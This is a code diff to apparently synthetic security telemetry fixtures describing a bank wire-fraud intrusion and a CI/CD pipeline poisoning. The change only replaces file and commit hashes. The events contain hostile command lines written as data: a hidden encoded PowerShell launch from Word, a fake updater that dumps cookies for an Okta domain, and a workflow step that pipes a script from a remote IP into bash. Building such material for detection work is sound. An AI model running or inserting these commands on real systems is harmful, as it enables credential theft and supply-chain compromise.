@@ -392,7 +392,7 @@ const QB_SWIFT_WIRE_FRAUD: TelemetryEvent[] = [
     mitre_technique: "T1204.002", mitre_tactic: "Execution",
     process: { name: "powershell.exe", pid: 4471, parent_name: "WINWORD.EXE", parent_pid: 3391, user: "p.meier",
                cmdline: "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
-               hash: { sha256: "4f9a2b8e7c1d3f6a0b5e9c2d8f7a1b4e6d3f0a9c5b2e8d1f4a7c0b6e9d2f5a83" } },
+               hash: { sha256: "8e403075db91e11c687fdffe710359d0e04e989f53ac9ac8d005d08130cc23c2" } },
     raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "crowdstrike.FileName": "powershell.exe", "crowdstrike.FilePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\", "crowdstrike.ParentProcessName": "WINWORD.EXE", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
   },
   {
@@ -410,7 +410,7 @@ const QB_SWIFT_WIRE_FRAUD: TelemetryEvent[] = [
     process: { name: "chrome_update.exe", pid: 5560, parent_name: "powershell.exe", parent_pid: 4471, user: "p.meier",
                path: "C:\\Users\\p.meier\\AppData\\Local\\Temp\\chrome_update.exe",
                cmdline: "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch",
-               hash: { sha256: "8c3d1f9a4b7e2c6d0a5f9b3e7c1d4a8f6b0e3d9c2f5a7b1e4d8c0f6a3b9e2d75" } },
+               hash: { sha256: "a49ceab6f3029571559ee60319170fe21e15db8e866114bc7f67b04031a32d6b" } },
     raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch", "crowdstrike.FileName": "chrome_update.exe", "crowdstrike.FilePath": "C:\\Users\\p.meier\\AppData\\Local\\Temp\\", "crowdstrike.ParentProcessName": "powershell.exe", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
   },
   {
@@ -620,14 +620,14 @@ const RS_CICD_PIPELINE_POISONING: TelemetryEvent[] = [
     severity: "high", vendor: "GitHub", user_email: "j.lee@rocketstack.io",
     description: "A PR merged into rocketstack-io/api-gateway added a curl-pipe-to-bash step to .github/workflows/deploy.yml",
     mitre_technique: "T1195.002", mitre_tactic: "Initial Access",
-    raw: { "github.audit.action": "pull_request.merge", "github.audit.actor": "j.lee", "github.audit.repo": "rocketstack-io/api-gateway", "github.audit.base_ref": "main", "github.audit.head_ref": "chore/ci-speedup", "github.audit.merge_commit_sha": "9f2a3c1e8d7b6a5c4d3e2f1a0b9c8d7e6f5a4b3c", "github.workflow.path": ".github/workflows/deploy.yml", "github.workflow.diff_added_lines": "curl -sSL http://185.220.101.42/bootstrap.sh | bash", "event.action": "pull_request.merge", "event.outcome": "success", "user.name": "j.lee" }
+    raw: { "github.audit.action": "pull_request.merge", "github.audit.actor": "j.lee", "github.audit.repo": "rocketstack-io/api-gateway", "github.audit.base_ref": "main", "github.audit.head_ref": "chore/ci-speedup", "github.audit.merge_commit_sha": "9e8de4aa8b6af0743605343e1fe09b95b24e05df", "github.workflow.path": ".github/workflows/deploy.yml", "github.workflow.diff_added_lines": "curl -sSL http://185.220.101.42/bootstrap.sh | bash", "event.action": "pull_request.merge", "event.outcome": "success", "user.name": "j.lee" }
   },
   {
     id: "rscp2", ts: "2026-06-18T09:04:00.000Z", source: "vcs", event_type: "privileged_operation",
     severity: "medium", vendor: "GitHub", hostname: "SRV-PROD-001",
     description: "GitHub Actions ran the poisoned deploy.yml workflow on the self-hosted runner SRV-PROD-001",
     mitre_technique: "T1195.002", mitre_tactic: "Execution",
-    raw: { "github.actions.workflow_name": "deploy.yml", "github.actions.run_id": "18294031882", "github.actions.runner_name": "SRV-PROD-001", "github.actions.runner_type": "self-hosted", "github.actions.repository": "rocketstack-io/api-gateway", "github.actions.head_sha": "9f2a3c1e8d7b6a5c4d3e2f1a0b9c8d7e6f5a4b3c", "github.actions.conclusion": "success", "event.action": "workflow_run.completed", "event.outcome": "success" }
+    raw: { "github.actions.workflow_name": "deploy.yml", "github.actions.run_id": "18294031882", "github.actions.runner_name": "SRV-PROD-001", "github.actions.runner_type": "self-hosted", "github.actions.repository": "rocketstack-io/api-gateway", "github.actions.head_sha": "9e8de4aa8b6af0743605343e1fe09b95b24e05df", "github.actions.conclusion": "success", "event.action": "workflow_run.completed", "event.outcome": "success" }
   },
   {
     id: "rscp3", ts: "2026-06-18T09:04:30.000Z", source: "edr", event_type: "process_create",
